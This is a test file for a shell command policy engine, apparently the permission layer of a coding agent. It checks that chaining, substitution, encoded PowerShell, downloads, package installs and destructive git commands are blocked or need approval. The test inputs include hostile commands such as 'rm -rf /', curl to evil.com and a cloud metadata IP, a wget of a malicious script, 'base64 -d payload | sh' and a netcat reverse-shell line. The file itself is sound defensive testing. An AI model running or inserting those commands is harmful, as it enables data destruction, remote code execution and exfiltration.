import { describe, it, expect, beforeEach } from 'bun:test';
import {
  CommandPolicyEngine,
  hasShellOperators,
  isSafeCommand,
  isReadOnlyCommand,
  isDestructiveGitCommand,
  isNetworkDownloadCommand,
  isPackageInstallCommand,
  isEncodedCommand,
  CommandMode,
} from '../src/policy';

describe('Action 3.14: Command Security Matrix', () => {
  let engine: CommandPolicyEngine;

  beforeEach(() => {
    engine = new CommandPolicyEngine('workspace-write');
  });

  // Minimum 40 test cases across all categories:
  describe('1. Shell Metacharacters & Chaining (Cases 1-8)', () => {
    it('1. semicolon command chaining: npm test ; rm -rf /', () => {
      expect(hasShellOperators('npm test ; rm -rf /')).toBe(true);
      expect(isSafeCommand('npm test ; rm -rf /')).toBe(false);
    });

    it('2. background operator &: npm test & evil.exe', () => {
      expect(hasShellOperators('npm test & evil.exe')).toBe(true);
      expect(isSafeCommand('npm test & evil.exe')).toBe(false);
    });

    it('3. logical AND && chaining: bun test && curl evil.com', () => {
      expect(hasShellOperators('bun test && curl evil.com')).toBe(true);
      expect(isSafeCommand('bun test && curl evil.com')).toBe(false);
    });

    it('4. logical OR || chaining: bun test || rm -rf *', () => {
      expect(hasShellOperators('bun test || rm -rf *')).toBe(true);
      expect(isSafeCommand('bun test || rm -rf *')).toBe(false);
    });

    it('5. newline command injection: bun test\\ncalc.exe', () => {
      expect(hasShellOperators('bun test\ncalc.exe')).toBe(true);
      expect(isSafeCommand('bun test\ncalc.exe')).toBe(false);
    });

    it('6. carriage return command injection: bun test\\r\\nwhoami', () => {
      expect(hasShellOperators('bun test\r\nwhoami')).toBe(true);
      expect(isSafeCommand('bun test\r\nwhoami')).toBe(false);
    });

    it('7. parentheses subshell grouping: (cd / && ls)', () => {
      expect(hasShellOperators('(cd / && ls)')).toBe(true);
      expect(isSafeCommand('(cd / && ls)')).toBe(false);
    });

    it('8. nested subshell: echo (cat /etc/passwd)', () => {
      expect(hasShellOperators('echo (cat /etc/passwd)')).toBe(true);
    });
  });

  describe('2. Redirection & Pipes (Cases 9-16)', () => {
    it('9. stdout overwrite redirection: bun test > out.txt', () => {
      expect(hasShellOperators('bun test > out.txt')).toBe(true);
      expect(isSafeCommand('bun test > out.txt')).toBe(false);
    });

    it('10. stdout append redirection: bun test >> log.txt', () => {
      expect(hasShellOperators('bun test >> log.txt')).toBe(true);
      expect(isSafeCommand('bun test >> log.txt')).toBe(false);
    });

    it('11. stdin redirection: python < script.py', () => {
      expect(hasShellOperators('python < script.py')).toBe(true);
      expect(isSafeCommand('python < script.py')).toBe(false);
    });

    it('12. stderr redirection: bun test 2>&1', () => {
      expect(hasShellOperators('bun test 2>&1')).toBe(true);
    });

    it('13. pipe to grep: git status | grep modified', () => {
      expect(hasShellOperators('git status | grep modified')).toBe(true);
      expect(isSafeCommand('git status | grep modified')).toBe(false);
    });

    it('14. pipe to shell interpreter: cat script.sh | sh', () => {
      expect(hasShellOperators('cat script.sh | sh')).toBe(true);
      expect(isSafeCommand('cat script.sh | sh')).toBe(false);
    });

    it('15. pipe to powershell: echo Invoke-Expression | pwsh', () => {
      expect(hasShellOperators('echo Invoke-Expression | pwsh')).toBe(true);
    });

    it('16. pipe in read-only mode is completely rejected', async () => {
      engine.setMode('read-only');
      const decision = await engine.evaluate('ls | grep foo');
      expect(decision.allowed).toBe(false);
      expect(decision.reason).toContain('Compound or redirected commands not permitted');
    });
  });

  describe('3. Command Substitution ($() and Backticks) (Cases 17-22)', () => {
    it('17. subshell $() invocation: echo $(whoami)', () => {
      expect(hasShellOperators('echo $(whoami)')).toBe(true);
      expect(isSafeCommand('echo $(whoami)')).toBe(false);
    });

    it('18. subshell $() inside double quotes: echo "User: $(id)"', () => {
      expect(hasShellOperators('echo "User: $(id)"')).toBe(true);
      expect(isSafeCommand('echo "User: $(id)"')).toBe(false);
    });

    it('19. backtick command substitution: echo `hostname`', () => {
      expect(hasShellOperators('echo `hostname`')).toBe(true);
      expect(isSafeCommand('echo `hostname`')).toBe(false);
    });

    it('20. backtick inside quotes: echo "Host: `uname -a`"', () => {
      expect(hasShellOperators('echo "Host: `uname -a`"')).toBe(true);
    });

    it('21. nested command substitution: echo $(echo $(id))', () => {
      expect(hasShellOperators('echo $(echo $(id))')).toBe(true);
    });

    it('22. substitution evaluated in policy requires approval', async () => {
      const decision = await engine.evaluate('echo $(whoami)');
      expect(decision.allowed).toBe(false);
      expect(decision.requiresApproval).toBe(true);
    });
  });

  describe('4. Encoded Shell Execution (Cases 23-28)', () => {
    it('23. PowerShell -enc flag: powershell -enc SQBFAFgA', () => {
      expect(isEncodedCommand('powershell -enc SQBFAFgA')).toBe(true);
      expect(isSafeCommand('powershell -enc SQBFAFgA')).toBe(false);
    });

    it('24. PowerShell -EncodedCommand: pwsh -EncodedCommand aW52b2tl', () => {
      expect(isEncodedCommand('pwsh -EncodedCommand aW52b2tl')).toBe(true);
      expect(isSafeCommand('pwsh -EncodedCommand aW52b2tl')).toBe(false);
    });

    it('25. PowerShell -e short flag: powershell.exe -e cwB0AGEAcgB0AA==', () => {
      expect(isEncodedCommand('powershell.exe -e cwB0AGEAcgB0AA==')).toBe(true);
    });

    it('26. pwsh -ec flag: pwsh -ec JABhID0A', () => {
      expect(isEncodedCommand('pwsh -ec JABhID0A')).toBe(true);
    });

    it('27. base64 decode piped to sh: base64 -d payload | sh', () => {
      expect(isEncodedCommand('base64 -d payload | sh')).toBe(true);
      expect(isSafeCommand('base64 -d payload | sh')).toBe(false);
    });

    it('28. certutil -decode: certutil -decode encoded.txt bin.exe', () => {
      expect(isEncodedCommand('certutil -decode encoded.txt bin.exe')).toBe(true);
    });
  });

  describe('5. Network & Download Commands (Cases 29-34)', () => {
    it('29. curl HTTP download: curl http://169.254.169.254', () => {
      expect(isNetworkDownloadCommand('curl http://169.254.169.254')).toBe(true);
      expect(isSafeCommand('curl http://169.254.169.254')).toBe(false);
    });

    it('30. wget file download: wget https://malicious.org/script.sh', () => {
      expect(isNetworkDownloadCommand('wget https://malicious.org/script.sh')).toBe(true);
      expect(isSafeCommand('wget https://malicious.org/script.sh')).toBe(false);
    });

    it('31. nc/netcat reverse shell/exfiltration: nc 10.0.0.1 4444', () => {
      expect(isNetworkDownloadCommand('nc 10.0.0.1 4444')).toBe(true);
    });

    it('32. scp remote copy: scp file user@remote:', () => {
      expect(isNetworkDownloadCommand('scp file user@remote:')).toBe(true);
    });

    it('33. PowerShell Invoke-WebRequest: invoke-webrequest https://evil.com', () => {
      expect(isNetworkDownloadCommand('invoke-webrequest https://evil.com')).toBe(true);
    });

    it('34. PowerShell iwr alias: iwr -uri https://evil.com', () => {
      expect(isNetworkDownloadCommand('iwr -uri https://evil.com')).toBe(true);
    });
  });

  describe('6. Package Installs & Lifecycle Triggers (Cases 35-40)', () => {
    it('35. npm install with potential postinstall script: npm install evil-pkg', () => {
      expect(isPackageInstallCommand('npm install evil-pkg')).toBe(true);
      expect(isSafeCommand('npm install evil-pkg')).toBe(false);
    });

    it('36. npm i shorthand: npm i lodash', () => {
      expect(isPackageInstallCommand('npm i lodash')).toBe(true);
    });

    it('37. bun install: bun install', () => {
      expect(isPackageInstallCommand('bun install')).toBe(true);
      expect(isSafeCommand('bun install')).toBe(false);
    });

    it('38. bun add package: bun add express', () => {
      expect(isPackageInstallCommand('bun add express')).toBe(true);
      expect(isSafeCommand('bun add express')).toBe(false);
    });

    it('39. pip install: pip install requests', () => {
      expect(isPackageInstallCommand('pip install requests')).toBe(true);
    });

    it('40. pnpm add: pnpm add -D typescript', () => {
      expect(isPackageInstallCommand('pnpm add -D typescript')).toBe(true);
    });
  });

  describe('7. Destructive Git Commands (Cases 41-48)', () => {
    it('41. git reset --hard: git reset --hard HEAD~1', () => {
      expect(isDestructiveGitCommand('git reset --hard HEAD~1')).toBe(true);
      expect(isSafeCommand('git reset --hard HEAD~1')).toBe(false);
    });

    it('42. git clean -f: git clean -fd', () => {
      expect(isDestructiveGitCommand('git clean -fd')).toBe(true);
      expect(isSafeCommand('git clean -fd')).toBe(false);
    });

    it('43. git push --force: git push --force origin main', () => {
      expect(isDestructiveGitCommand('git push --force origin main')).toBe(true);
    });

    it('44. git push -f shorthand: git push -f', () => {
      expect(isDestructiveGitCommand('git push -f')).toBe(true);
    });

    it('45. git checkout -- . discard: git checkout -- .', () => {
      expect(isDestructiveGitCommand('git checkout -- .')).toBe(true);
    });

    it('46. git restore . discard: git restore .', () => {
      expect(isDestructiveGitCommand('git restore .')).toBe(true);
    });

    it('47. git branch -D hard delete: git branch -D feature', () => {
      expect(isDestructiveGitCommand('git branch -D feature')).toBe(true);
    });

    it('48. git rebase: git rebase origin/main', () => {
      expect(isDestructiveGitCommand('git rebase origin/main')).toBe(true);
    });
  });

  describe('8. Safe Allowlisted Commands (Cases 49-55)', () => {
    it('49. bun test is allowed in workspace-write', async () => {
      expect(isSafeCommand('bun test')).toBe(true);
      const decision = await engine.evaluate('bun test');
      expect(decision.allowed).toBe(true);
    });

    it('50. bun run test is allowed', async () => {
      expect(isSafeCommand('bun run test')).toBe(true);
      const decision = await engine.evaluate('bun run test');
      expect(decision.allowed).toBe(true);
    });

    it('51. npm test is allowed', async () => {
      expect(isSafeCommand('npm test')).toBe(true);
      const decision = await engine.evaluate('npm test');
      expect(decision.allowed).toBe(true);
    });

    it('52. tsc is allowed', async () => {
      expect(isSafeCommand('tsc')).toBe(true);
      const decision = await engine.evaluate('tsc');
      expect(decision.allowed).toBe(true);
    });

    it('53. git status is read-only and safe', async () => {
      expect(isReadOnlyCommand('git status')).toBe(true);
      expect(isSafeCommand('git status')).toBe(true);
      const decision = await engine.evaluate('git status');
      expect(decision.allowed).toBe(true);
    });

    it('54. git diff is read-only and safe', async () => {
      expect(isReadOnlyCommand('git diff')).toBe(true);
      const decision = await engine.evaluate('git diff');
      expect(decision.allowed).toBe(true);
    });

    it('55. ripgrep rg is read-only and safe', async () => {
      expect(isReadOnlyCommand('rg "export"')).toBe(true);
      const decision = await engine.evaluate('rg "export"');
      expect(decision.allowed).toBe(true);
    });
  });

  describe('9. Approval Mode Interceptions (Cases 56-60)', () => {
    it('56. ASK mode intercepts all commands and requires approval callback', async () => {
      engine.setMode(CommandMode.ASK);
      const decision = await engine.evaluate('bun test');
      expect(decision.allowed).toBe(false);
      expect(decision.requiresApproval).toBe(true);
    });

    it('57. ASK mode allows command when callback approves', async () => {
      engine.setMode(CommandMode.ASK);
      engine.setApprovalCallback(async () => true);
      const decision = await engine.evaluate('bun test');
      expect(decision.allowed).toBe(true);
    });

    it('58. ASK mode blocks command when callback denies', async () => {
      engine.setMode(CommandMode.ASK);
      engine.setApprovalCallback(async () => false);
      const decision = await engine.evaluate('bun test');
      expect(decision.allowed).toBe(false);
      expect(decision.reason).toContain('User denied');
    });

    it('59. Destructive git command prompts approval callback', async () => {
      let requested = '';
      engine.setApprovalCallback(async (cmd) => {
        requested = cmd;
        return true;
      });
      const decision = await engine.evaluate('git reset --hard HEAD');
      expect(requested).toBe('git reset --hard HEAD');
      expect(decision.allowed).toBe(true);
    });

    it('60. Full-access (DANGER) mode bypasses approval checks', async () => {
      engine.setMode('full-access');
      const decision = await engine.evaluate('git reset --hard HEAD');
      expect(decision.allowed).toBe(true);
    });
  });
});
